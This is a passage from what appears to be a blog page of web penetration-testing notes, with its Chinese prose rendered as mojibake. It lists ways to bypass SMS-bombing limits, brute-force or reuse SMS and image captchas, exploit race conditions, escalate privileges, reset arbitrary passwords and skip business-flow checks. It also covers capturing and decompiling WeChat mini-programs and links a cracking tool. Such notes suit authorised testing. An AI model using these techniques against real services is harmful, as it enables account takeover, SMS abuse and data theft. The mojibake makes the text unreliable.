çš„æƒé™èƒ½è®¿é—®ç³»ç»Ÿçš„é‚£äº›èµ„æºï¼Œå½“æˆ‘ä»¬èº«ä»½è®¤è¯é€šè¿‡åéœ€è¦åˆ†é…æƒé™å†³å®šä½ å¯ä»¥è®¿é—®é‚£äº›èµ„æºã€‚</p></li><li><p>æƒé™æ§åˆ¶</p><p>æƒé™æ§åˆ¶æ˜¯ä¸€ç§åŸºäºç”¨æˆ·å…·æœ‰ç‰¹å®šæƒé™æ¥é™åˆ¶å…¶å¯¹ç³»ç»Ÿèµ„æºè®¿é—®çš„æœºåˆ¶ã€‚</p><p>æ¯ä¸ªç”¨æˆ·è¢«åˆ†é…äº†ä¸€ç»„æƒé™ï¼Œè¿™äº›æƒé™å®šä¹‰äº†ä»–ä»¬å¯ä»¥æ‰§è¡Œçš„æ“ä½œã€‚</p><p>ä¾‹å¦‚ï¼Œä¸€ä¸ªç”¨æˆ·å¯èƒ½è¢«æˆäºˆè¯»å–ã€å†™å…¥æˆ–åˆ é™¤æ–‡ä»¶çš„æƒé™ã€‚å½“ç”¨æˆ·å°è¯•è®¿é—®æŸä¸ªèµ„æºæ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥å…¶æ˜¯å¦å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œè¯¥æ“ä½œã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰æ‰€éœ€çš„æƒé™ï¼Œåˆ™è®¿é—®å°†è¢«æ‹’ç»ã€‚</p></li><li><p>è§’è‰²æ§åˆ¶</p><p>è§’è‰²æ§åˆ¶æ˜¯ä¸€ç§åŸºäºç”¨æˆ·å…·æœ‰ç‰¹å®šè§’è‰²æ¥é™åˆ¶å…¶å¯¹ç³»ç»Ÿèµ„æºè®¿é—®çš„æœºåˆ¶ã€‚</p><p>æ¯ä¸ªè§’è‰²åŒ…å«äº†ä¸€ç»„æƒé™ï¼Œè€Œç”¨æˆ·åˆ™è¢«åˆ†é…åˆ°ä¸åŒçš„è§’è‰²ä¸­ã€‚é€šè¿‡å°†ç”¨æˆ·ä¸è§’è‰²ç›¸å…³è”ï¼Œå¯ä»¥çµæ´»åœ°ç®¡ç†ç”¨æˆ·çš„æƒé™ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸€ä¸ªç®¡ç†å‘˜è§’è‰²å¯èƒ½å…·æœ‰æ›´é«˜çº§åˆ«çš„æƒé™ï¼Œè€Œæ™®é€šç”¨æˆ·è§’è‰²åˆ™åªèƒ½æ‰§è¡ŒåŸºæœ¬æ“ä½œã€‚å½“ç”¨æˆ·å°è¯•è®¿é—®æŸä¸ªèµ„æºæ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥å…¶æ‰€å±çš„è§’è‰²æ˜¯å¦å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œè¯¥æ“ä½œã€‚å¦‚æœç”¨æˆ·æ‰€å±è§’è‰²ä¸å…·å¤‡æ‰€éœ€çš„æƒé™ï¼Œåˆ™è®¿é—®å°†è¢«æ‹’ç»ã€‚</p></li></ul><h2 id="éªŒè¯ç "><a href="#éªŒè¯ç " class="headerlink" title="éªŒè¯ç "></a>éªŒè¯ç </h2><h3 id="çŸ­ä¿¡éªŒè¯ç "><a href="#çŸ­ä¿¡éªŒè¯ç " class="headerlink" title="çŸ­ä¿¡éªŒè¯ç "></a>çŸ­ä¿¡éªŒè¯ç </h3><ul><li><p>çŸ­ä¿¡è½°ç‚¸</p><p>ç»•è¿‡æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+86</span><br><span class="line">å‰åç©ºæ ¼</span><br><span class="line">å¤šæ‰‹æœºå·å‚æ•°</span><br><span class="line">æ·»åŠ é€—å·</span><br><span class="line"><span class="built_in">type</span>å‚æ•°</span><br><span class="line">æ‰‹æœºå·é•¿åº¦</span><br><span class="line">Fuzzï¼ˆä½ç½®æ‰‹æœºå·å‰ï¼Œåï¼Œå‰åï¼‰</span><br></pre></td></tr></table></figure></li><li><p>æš´åŠ›ç ´è§£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šå¸¸çŸ­ä¿¡éªŒè¯ç æœ‰æ•ˆæœŸä¸º1minï¼Œåªèƒ½çˆ†4ä½çš„</span><br></pre></td></tr></table></figure></li><li><p>æš´åŠ›ç”Ÿæˆç ´è§£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥è¿›è¡ŒçŸ­ä¿¡è½°ç‚¸ï¼Œä½†ä¸å…è®¸æš´åŠ›ç ´è§£ï¼ˆè®¾ç½®äº†éªŒè¯æ¬¡æ•°ï¼‰</span><br><span class="line">è¾¾åˆ°éªŒè¯æ¬¡æ•°åå°±é‡æ–°ç”ŸæˆçŸ­ä¿¡éªŒè¯ç ï¼Œç„¶åå†æ¬¡ç ´è§£</span><br></pre></td></tr></table></figure></li><li><p>å†…å®¹ç¯¡æ”¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trubo Intruderçš„%så›æ˜¾</span><br><span class="line">éªŒè¯ç ç”±å®¢æˆ·ç«¯å‘é€</span><br></pre></td></tr></table></figure></li><li><p>çŸ­ä¿¡åˆ†å‘</p><blockquote><p>ä¸€æ¬¡å‘é€ç»™å¤šä¸ªæ‰‹æœºå·å¹¶ä¸”æ”¶åˆ°çš„éªŒè¯ç æ˜¯ç›¸åŒçš„</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;phone&quot;</span><span class="punctuation">:</span><span class="string">&quot;phone1,phone2&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>å¤±æ•ˆ</p><ul><li><p>åç«¯å®é™…ä¸æ ¡éªŒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç ç½®ç©ºï¼Œåˆ é™¤ï¼Œä»»æ„å€¼</span><br></pre></td></tr></table></figure></li><li><p>æœåŠ¡ç«¯å›æ˜¾</p></li><li><p>éªŒè¯ç å¤ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç çš„æœ‰æ•ˆæœŸè¿‡é•¿ï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨åä»å¯ä»¥å†æ¬¡ä½¿ç”¨</span><br><span class="line">æˆ–è€…</span><br><span class="line">åœ¨ä¸€å®šæ—¶é—´å†…å‘é€çš„çŸ­ä¿¡éƒ½æ˜¯ç›¸åŒçš„</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ç»‘å®šå…³ç³»å¤±æ•ˆ</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç æœªä¸æ‰‹æœºå·è¿›è¡Œç»‘å®š</span><br><span class="line">æœ€ç»ˆæäº¤æ—¶å­˜åœ¨ä¸¤ä¸ªæ‰‹æœºå·å‚æ•°ï¼šä¸€ä¸ªç”¨äºéªŒè¯çŸ­ä¿¡éªŒè¯ç ï¼Œä¸€ä¸ªç”¨äºæ³¨å†Œ/ç™»å½•ï¼Œåç«¯æ²¡æœ‰å¯¹è¿™ä¸¤ä¸ªå‚æ•°åšä¸€è‡´æ€§æ ¡éªŒ</span><br></pre></td></tr></table></figure></li><li><p>çŸ­ä¿¡éªŒè¯ç å­˜åœ¨é»˜è®¤å€¼</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰€æœ‰æ‰‹æœºå·å‡å­˜åœ¨é»˜è®¤çŸ­ä¿¡éªŒè¯ç ï¼ˆæ²¡ç¢°åˆ°è¿‡ï¼‰</span><br><span class="line">æˆ–è€…åªæœ‰æµ‹è¯•æ‰‹æœºå·å­˜åœ¨é»˜è®¤çŸ­ä¿¡éªŒè¯ç ï¼ˆç¢°åˆ°è¿‡ï¼‰</span><br></pre></td></tr></table></figure></li></ul><h3 id="å›¾å½¢éªŒè¯ç "><a href="#å›¾å½¢éªŒè¯ç " class="headerlink" title="å›¾å½¢éªŒè¯ç "></a>å›¾å½¢éªŒè¯ç </h3><p><a href="https://mp.weixin.qq.com/s/a03-z_dk21DhbG025aqAeg">ç›˜ç‚¹å›¾å½¢éªŒè¯ç çš„æ¼æ´æŒ–æ˜æ–¹å¼ï¼Œçœ‹å®Œä¹‹åä½ è¿˜ä¸ä¼šæŒ–å—ï¼Ÿ</a></p><ul><li><p>å›¾å½¢éªŒè¯ç è¯†åˆ«</p><p><a href="https://github.com/f0ng/captcha-killer-modified/blob/main/FAQ.md">captcha-killer-modified&#x2F;FAQ.md at main Â· f0ng&#x2F;captcha-killer-modified</a></p><p><a href="https://www.cnblogs.com/4geek/p/17145385.html#!comments">ã€Securityã€‘åˆ©ç”¨Burp Suiteçˆ†ç ´å¸¦æœ‰éªŒè¯ç Webç™»å½•æ¥å£ï¼ˆä¿å§†çº§æ•™ç¨‹ï¼‰ - ä¸ºæå®¢è€Œç”Ÿ - åšå®¢å›­</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">regexï¼š<span class="string">&quot;token&quot;</span>:<span class="string">&quot;(.*?)&quot;</span></span><br><span class="line">[*]  use @captcha@ replace captcha</span><br><span class="line">[*]  use @captcha-killer-modified@ replace captcha<span class="string">&#x27;s token</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230918104832773.png?lastModify=1695029992" alt="image-20230918104832773"></p></li><li><p>å›¾å½¢éªŒè¯ç å¤ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å›¾å½¢éªŒè¯ç æœ‰æ•ˆæ—¶é—´è¿‡é•¿ï¼ˆç¢°åˆ°è¿‡ä¸€ä¸ªéªŒè¯ç ä¿¡æ¯å­˜å‚¨åœ¨JWTçš„</span><br><span class="line">é‡Œçš„ï¼Œé€šè¿‡ä¿®æ”¹EXPä»è€ŒéªŒè¯ç å¤ç”¨ï¼‰</span><br><span class="line"></span><br><span class="line">æ²¡æœ‰é‡ç½®å›¾å½¢éªŒè¯ç </span><br><span class="line"></span><br><span class="line">åç«¯å®é™…ä¸æ ¡éªŒéªŒè¯ç </span><br></pre></td></tr></table></figure></li><li><p>å›¾å½¢éªŒè¯ç Dosæ”»å‡»</p><p>é€šè¿‡æ§åˆ¶å›¾å½¢éªŒè¯ç çš„å¤§å°</p></li></ul><h2 id="å¹¶å‘â€“æ¡ä»¶ç«äº‰"><a href="#å¹¶å‘â€“æ¡ä»¶ç«äº‰" class="headerlink" title="å¹¶å‘â€“æ¡ä»¶ç«äº‰"></a>å¹¶å‘â€“æ¡ä»¶ç«äº‰</h2><p>ä¸‡ç‰©çš†å¯å¹¶å‘</p><p><img src="/../images/image-20230826174437969.png?lastModify=1695029992" alt="image-20230826174437969"></p><p><strong>ä¿®å¤æ–¹æ¡ˆ</strong></p><p>æ•°æ®åº“çš„äº‹åŠ¡é”</p><h2 id="è¶Šæƒæ¼æ´"><a href="#è¶Šæƒæ¼æ´" class="headerlink" title="è¶Šæƒæ¼æ´"></a>è¶Šæƒæ¼æ´</h2><ul><li><p>å‚ç›´è¶Šæƒ</p><p>æƒé™æ ¡éªŒä¸å……åˆ†ï¼Œå¯¼è‡´ä½æƒé™ç”¨æˆ·å¯ä»¥è®¿é—®é«˜æƒé™ç”¨æˆ·çš„æ¥å£ï¼Œæ¯”å¦‚è¯´éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·å°±èƒ½è®¿é—®å„ç§æŸ¥è¯¢æ¥å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦‚ä½•æŒ–æ˜ï¼š</span><br><span class="line">å¦‚æœæœ‰ç®¡ç†å‘˜è´¦å·å’Œæ™®é€šç”¨æˆ·è´¦å·å°±æ¯”è¾ƒç®€å•ï¼Œç®¡ç†æ“ä½œï¼Œç„¶åæ›¿æ¢æ•°æ®åŒ…ä¸­çš„é‰´æƒéƒ¨åˆ†ä¸ºæ™®é€šç”¨æˆ·çš„</span><br><span class="line">å¦‚æœåªæœ‰æ™®é€šç”¨æˆ·çš„è´¦å·ï¼Œæˆ‘è§‰å¾—ä¸»è¦æ˜¯å¦‚ä½•è·å¾—æ•æ„Ÿæ¥å£ï¼Œä¸€ç§æ˜¯é€šè¿‡è¢«åŠ¨æ‰«ææ¥æ‰¾åˆ°æ¥å£æ–‡æ¡£ï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡ä»jsæ–‡ä»¶ä¸­æ‰‹åŠ¨æ„é€ æˆ–è€…fuzzæ¥å£çš„åç§°</span><br></pre></td></tr></table></figure></li><li><p>æ°´å¹³è¶Šæƒ</p><p>æ™®é€šç”¨æˆ·æ‹¥æœ‰å…¶ä»–å¹³è¡Œçº§åˆ«ç”¨æˆ·çš„æƒé™ï¼Œæ¯”è¾ƒå¸¸è§çš„å°±æ˜¯åœ¨è·å–ä¸ªäººä¿¡æ¯å¤„é€šè¿‡éå†idè·å¾—å…¶ä»–ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ€å¸¸è§çš„å°±æ˜¯é€šè¿‡useridï¼Œidç­‰å‚æ•°æ¥è¿›è¡Œæ ¡éªŒèº«ä»½</span><br><span class="line">æœ€å¥½çš„è¯è¿˜æ˜¯æ³¨å†Œä¸¤ä¸ªè´¦æˆ·è¿›è¡Œæµ‹è¯•ï¼Œè¿™æ ·æ›´å¥½å‘ç°</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¶Šæƒæ¼æ´å’Œéå†æ¼æ´çš„åŒºåˆ«ï¼š</span><br><span class="line">åŠŸèƒ½ç‚¹çš„æƒé™åˆ†é…ä¸åŒã€‚è¶Šæƒæ¼æ´äº§ç”Ÿçš„åŠŸèƒ½ç‚¹æ˜¯å±äºç‰¹å®šç”¨æˆ·æ‰èƒ½ä½¿ç”¨çš„ï¼Œè€Œéå†æ¼æ´äº§ç”Ÿçš„åŠŸèƒ½ç‚¹æ˜¯åº”ç”¨æœ¬èº«å°±éœ€è¦ç”¨åˆ°çš„ï¼Œåªæ˜¯åº”ç”¨æ²¡æœ‰åšå¥½é¢‘ç‡æ§åˆ¶å’Œæ•°æ®æ‹–å–é™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡éå†æŸä¸ªå‚æ•°è·å¾—å¤§é‡æ•æ„Ÿä¿¡æ¯ï¼Œä»è€Œé€ æˆå±å®³ã€‚</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¿®å¤æ–¹æ¡ˆ</strong></p><ul><li>è¿›è¡Œåˆç†çš„æƒé™åˆ’åˆ†ã€‚</li><li>æƒé™æœ€å°åŒ–åŸåˆ™ï¼Œé™åˆ¶ç”¨æˆ·ä¸å¿…è¦çš„æƒé™ï¼Œç”¨æˆ·æƒé™è¿‡æœŸååº”å½“äºˆä»¥å›æ”¶ã€‚</li><li>åœ¨æœåŠ¡ç«¯å¯¹ç”¨æˆ·æƒé™è¿›è¡Œæ ¡éªŒã€‚</li></ul><h2 id="ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®"><a href="#ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®" class="headerlink" title="ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®"></a>ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessionè¦†ç›–ï¼ˆsessionæ ¡éªŒèº«ä»½ï¼‰</span><br><span class="line">å¯†ç é‡ç½®é“¾æ¥ï¼ˆå¼±Token:æ—¶é—´æˆ³ï¼ŒuidåŠ å¯†/ç¼–ç    uid:ä»»æ„é‡ç½®å…¶ä»–ç”¨æˆ·ï¼‰</span><br><span class="line">ç»‘å®šå…³ç³»å¤±æ•ˆ--ä¿®æ”¹ç”¨äºæ ¡éªŒçš„æ‰‹æœºå·/é‚®ç®±</span><br><span class="line">éªŒè¯ç é—®é¢˜</span><br></pre></td></tr></table></figure><h2 id="ä¸šåŠ¡æµç¨‹ç»•è¿‡"><a href="#ä¸šåŠ¡æµç¨‹ç»•è¿‡" class="headerlink" title="ä¸šåŠ¡æµç¨‹ç»•è¿‡"></a>ä¸šåŠ¡æµç¨‹ç»•è¿‡</h2><ul><li><p>è¯·æ±‚æäº¤åç”±å‰ç«¯è¿›è¡Œæ ¡éªŒï¼Œæ­¤æ—¶å¯ä»¥æ‹¦æˆªè¿”å›åŒ…ï¼Œä¿®æ”¹è¿”å›åŒ…ä¸­çš„å†…å®¹ï¼Œä»è€Œé€šè¿‡æ ¡éªŒã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ‰æ—¶å€™æ²¡å•¥ç”¨ï¼Œå³ä½¿èƒ½é€šè¿‡æ ¡éªŒï¼Œä½†æ˜¯ä¸ä¼šè¿”å›tokenï¼Œè¿›å…¥åˆ°ä¸‹ä¸€æ­¥ååç«¯æ ¡éªŒtokenåˆè¿”å›åˆ°ä¸Šä¸€ä¸ªæµç¨‹æˆ–è€…å‹æ ¹æ²¡æœ‰æ•°æ®ã€‚</span><br></pre></td></tr></table></figure></li><li><p>å…ˆè¿›å…¥åå°ç•Œé¢ï¼Œå†å¼¹å‡ºæ ¡éªŒç•Œé¢ï¼Œå¯ä»¥å°è¯•dropæ‰è¯¥æ ¡éªŒæ•°æ®åŒ…</p><p><a href="https://www.t00ls.com/articles-70325.html">æ±‚åŠ©å¯¹æœªæˆæƒçš„â€œç™»å½•è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•â€ç«™ç‚¹åˆ©ç”¨æ–¹å¼ - T00ls.Com</a></p></li><li><p>å¤šæµç¨‹è·³è¿‡</p><p>ï¼ˆ1ï¼‰ç”¨æˆ·è¾“å…¥æ‰¾å›å¯†ç çš„è´¦å·ï¼› </p><p>ï¼ˆ2ï¼‰æ ¡éªŒå‡­è¯ï¼šå‘ç”¨æˆ·å‘é€çŸ­ä¿¡éªŒè¯ç æˆ–è€…æ‰¾å›å¯†ç é“¾æ¥ï¼Œç”¨æˆ·å›å¡«éªŒè¯ç æˆ–å•å‡» é“¾æ¥è¿›å…¥å¯†ç é‡ç½®é¡µé¢ï¼Œä»¥æ­¤æ–¹å¼è¯æ˜å½“å‰æ“ä½œç”¨æˆ·æ˜¯è´¦å·ä¸»äººï¼› </p><p>ï¼ˆ3ï¼‰æ ¡éªŒæˆåŠŸè¿›å…¥é‡ç½®å¯†ç é¡µé¢ã€‚</p><p>æ‰¾å‡ºæœ€åä¸€æ­¥é‡ç½®å¯†ç çš„æ¥å£ï¼Œæ¥ç€ä½¿ç”¨URLæµ‹è¯•æ˜¯å¦å¯ä»¥è·³è¿‡éªŒè¯èº«ä»½ç¯èŠ‚ã€‚</p></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://fgtbnc.github.io/2023/06/01/JWT%E4%BB%A4%E7%89%8C/">JWTå®‰å…¨ | Khaz (fgtbnc.github.io)</a></p><h2 id="æ”¯ä»˜å®‰å…¨â€“å¾…æµ‹"><a href="#æ”¯ä»˜å®‰å…¨â€“å¾…æµ‹" class="headerlink" title="æ”¯ä»˜å®‰å…¨â€“å¾…æµ‹"></a>æ”¯ä»˜å®‰å…¨â€“å¾…æµ‹</h2><ul><li>æ•´å‹æº¢å‡º</li><li>ç²¾åº¦ä¿ç•™</li><li>è´Ÿæ•°</li><li>ä¿®æ”¹æ”¯ä»˜ç›¸å…³å‚æ•°</li><li>æ”¯ä»˜æ¥å£</li></ul><h1 id="å¾®ä¿¡å°ç¨‹åºå’Œå…¬ä¼—å·"><a href="#å¾®ä¿¡å°ç¨‹åºå’Œå…¬ä¼—å·" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºå’Œå…¬ä¼—å·"></a>å¾®ä¿¡å°ç¨‹åºå’Œå…¬ä¼—å·</h1><blockquote><p>è¿™ä¸¤æœ‰çš„ä¼šæ ¡éªŒæ•°æ®åŒ…ä¸­çš„User-Agentï¼Œæ‰€ä»¥ç”¨ä¸€äº›æ‰«æå·¥å…·çš„æ—¶å€™è¦å¸¦ä¸Šå¯¹åº”çš„User-Agentæ‰è¡Œ</p><p><img src="/../images/image-20230828114848695.png?lastModify=1695029992" alt="image-20230828114848695"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å…¬ä¼—å·</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090621) XWEB/8287 Flue</span><br><span class="line"></span><br><span class="line"># å°ç¨‹åº</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8287</span><br></pre></td></tr></table></figure></blockquote><h2 id="å°ç¨‹åºæ¥å£â†’Webåå°"><a href="#å°ç¨‹åºæ¥å£â†’Webåå°" class="headerlink" title="å°ç¨‹åºæ¥å£â†’Webåå°"></a>å°ç¨‹åºæ¥å£â†’Webåå°</h2><blockquote><p>å¼€å‘è€…ä¸ºäº†æ–¹ä¾¿ç®¡ç†å’Œè°ƒè¯•ï¼Œä¼šåœ¨å…¬ç½‘ Api åç«¯æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ªåå°ç®¡ç†ç•Œé¢ä»è€Œæ–¹ä¾¿ç®¡ç†æ•°æ®</p></blockquote><p>æŠŠå°ç¨‹åºæŠ“åŒ…æ—¶çš„urlå¤åˆ¶åˆ°æµè§ˆå™¨ä¸­ï¼Œå¯»æ‰¾åå°ï¼ˆè›®å¤šçš„ğŸ¤—ï¼‰</p><p>æ¯”å¦‚</p><p><img src="/../images/image-20230917224011775.png?lastModify=1695029992" alt="image-20230917224011775"></p><p>å°±è¿™ä¸ªåå°å‡ºäº†ä¸‰ä¸ªé«˜å±ï¼Œå¼±å£ä»¤ï¼Œä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå­˜å‚¨å‹xss</p><h2 id="å°ç¨‹åºæœ¬èº«"><a href="#å°ç¨‹åºæœ¬èº«" class="headerlink" title="å°ç¨‹åºæœ¬èº«"></a>å°ç¨‹åºæœ¬èº«</h2><h3 id="å°ç¨‹åºç»“æ„"><a href="#å°ç¨‹åºç»“æ„" class="headerlink" title="å°ç¨‹åºç»“æ„"></a>å°ç¨‹åºç»“æ„</h3><p><a href="https://kangzubin.com/wxapp-decompile-2/">å¾®ä¿¡å°ç¨‹åºâ€œåç¼–è¯‘â€å®æˆ˜ï¼ˆäºŒï¼‰ï¼šæºç è¿˜åŸ | å½¬å½¬çš„åšå®¢ (kangzubin.com)</a></p><h3 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h3><p>PCï¼šproxifier+burp</p><p>Androidï¼šåŒä¸€ä¸ªå±€åŸŸç½‘ä¸‹ï¼Œwifiä»£ç†+burp</p><h3 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h3><p>ä¸€é”®è§£å¯†+åç¼–è¯‘å·¥å…·</p><p><a href="https://pan.baidu.com/s/1N3ZR3djSaS8g_RXc0Hsa5Q?login_type=qzone&amp;pwd=f79y&amp;_at_=1693833286263">https://pan.baidu.com/s/1N3ZR3djSaS8g_RXc0Hsa5Q?login_type=qzone&amp;pwd=f79y&amp;_at_=1693833286263</a></p><p><strong>æ³¨æ„ç‚¹ï¼šè¿›å…¥å°ç¨‹åºåï¼Œå…ˆæŠŠå„ç§åŠŸèƒ½ç‚¹ç‚¹ï¼ŒåŠ è½½æ›´å¤šçš„ç¨‹åºä¹‹åå†è¿›è¡Œåç¼–è¯‘</strong></p><p>å°ç¨‹åºæ‰“å¼€æ—¶</p><p><img src="/../images/image-20230904221313214.png?lastModify=1695029992" alt="image-20230904221313214"></p><p>æ‰“å¼€ç‚¹ç‚¹ç‚¹ä¹‹åï¼Œç‚¹äº†ä¸€éƒ¨åˆ†åå°±å¤šäº†3MB</p><p><img src="/../images/image-20230904221135890.png?lastModify=1695029992" alt="image-20230904221135890"></p><ul><li><p>PC</p><p>éœ€è¦å…ˆè§£å¯†ï¼Œå†åç¼–è¯‘ï¼Œå°ç¨‹åºæ–‡ä»¶ä½ç½®å¦‚ä¸‹</p><p><img src="/../images/image-20230730143531751.png?lastModify=1695029992" alt="image-20230730143531751"></p></li><li><p>Android</p><p>ç›´æ¥åç¼–è¯‘å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/df69765be7b6e4a441a86a25d26e861f/appbrand/pkg/_-1486048203_3.wxapkg</span><br></pre></td></tr></table></figure></li></ul><h3 id="å…³æ³¨ç‚¹"><a href="#å…³æ³¨ç‚¹" class="headerlink" title="å…³æ³¨ç‚¹"></a>å…³æ³¨ç‚¹</h3><p><img src="/../images/%E5%B0%8F%E7%A8%8B%E5%BA%8FWEB%E6%BC%8F%E6%B4%9E_resultat.png?lastModify=1695029992" alt="image-20200508220108393"></p><h3 id="sessionkeyæ³„æ¼"><a href="#sessionkeyæ³„æ¼" class="headerlink" title="sessionkeyæ³„æ¼"></a>sessionkeyæ³„æ¼</h3><p><img src="/../images/image-20230919105141460.png" alt="image-20230919105141460"></p><p>è§£å¯†</p><p><strong><img src="/../images/image-20230919102958607.png" alt="image-20230919102958607"></strong></p><h3 id="åç¼–è¯‘è°ƒè¯•"><a href="#åç¼–è¯‘è°ƒè¯•" class="headerlink" title="åç¼–è¯‘è°ƒè¯•"></a>åç¼–è¯‘è°ƒè¯•</h3><p><strong>æŠ¥é”™ä¿®å¤</strong></p><p><img src="/../images/image-20230904215939364.png?lastModify=1695029992" alt="image-20230904215939364"></p><p><img src="/../images/image-20230904215953140.png?lastModify=1695029992" alt="image-20230904215953140"></p><p>wxmlæ–‡ä»¶ï¼ˆæ ·å¼æ–‡ä»¶ï¼‰æŠ¥é”™ä¿®å¤ï¼šç›´æ¥åˆ é™¤</p><p>æ’ä»¶ä¿®å¤ï¼šé‡åˆ°ä¸éœ€è¦ä½¿ç”¨çš„æ’ä»¶ç›´æ¥åˆ é™¤ï¼Œè¦ç”¨åˆ°çš„æ’ä»¶å»å®˜æ–¹åå°æ·»åŠ </p><h5 id="æµé‡åŠ å¯†è°ƒè¯•"><a href="#æµé‡åŠ å¯†è°ƒè¯•" class="headerlink" title="æµé‡åŠ å¯†è°ƒè¯•"></a>æµé‡åŠ å¯†è°ƒè¯•</h5><h5 id="ç­¾åç»•è¿‡è°ƒè¯•"><a href="#ç­¾åç»•è¿‡è°ƒè¯•" class="headerlink" title="ç­¾åç»•è¿‡è°ƒè¯•"></a>ç­¾åç»•è¿‡è°ƒè¯•</h5><h2 id="å…¬ä¼—å·"><a href="#å…¬ä¼—å·" class="headerlink" title="å…¬ä¼—å·"></a>å…¬ä¼—å·</h2><p>è·Ÿwebæ€è·¯ä¸€æ ·ï¼Œæ³¨æ„UAå¤´å³å¯</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.hackinn.com/index.php/archives/672/">å¾®ä¿¡å°ç¨‹åºçš„æ¸—é€äº”è„‰ - Hack Inn</a></p><p><a href="https://forum.butian.net/share/1227">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-æµ…è°ˆå¾®ä¿¡å°ç¨‹åºæ¸—é€</a></p><p><a href="https://developers.weixin.qq.com/community/minihome/list/1591986099080445956/2">å®‰å…¨ä¸­å¿ƒå…¬å‘Š | å¾®ä¿¡å¼€æ”¾ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/KfhgP97alL_d8mmOY4z44w">åç¼–è¯‘&amp;è°ƒè¯•å°ç¨‹åºè¯·æ±‚ç­¾å (qq.com)</a></p><h1 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h1><h2 id="Linuxå‘½ä»¤"><a href="#Linuxå‘½ä»¤" class="headerlink" title="Linuxå‘½ä»¤"></a>Linuxå‘½ä»¤</h2><blockquote><p>Winodwsä¸‹å¯ä»¥è£…ä¸ªwls2</p><p>å°´å°¬ç‚¹ğŸ˜…</p><p>wsl2éœ€è¦å¼€å¯hyper-Vï¼Œä½†æ˜¯å®‰å“æ¨¡æ‹Ÿå™¨åˆè¦å…³é—­hyper-vï¼Œè€Œä¸”VM15.5ä»¥ä¸‹çš„ç‰ˆæœ¬ä¹Ÿéœ€è¦å…³é—­hyper-Vã€‚</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…³é—­hyper-Våé‡æ–°å¼€å¯wsl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å¯hyper-V</span></span><br><span class="line">dism.exe /Online /<span class="built_in">Enable-Feature</span> /All /FeatureName:Microsoft<span class="literal">-Hyper-V</span></span><br><span class="line"><span class="comment"># å¼€å¯wslæ”¯æŒ</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> Microsoft<span 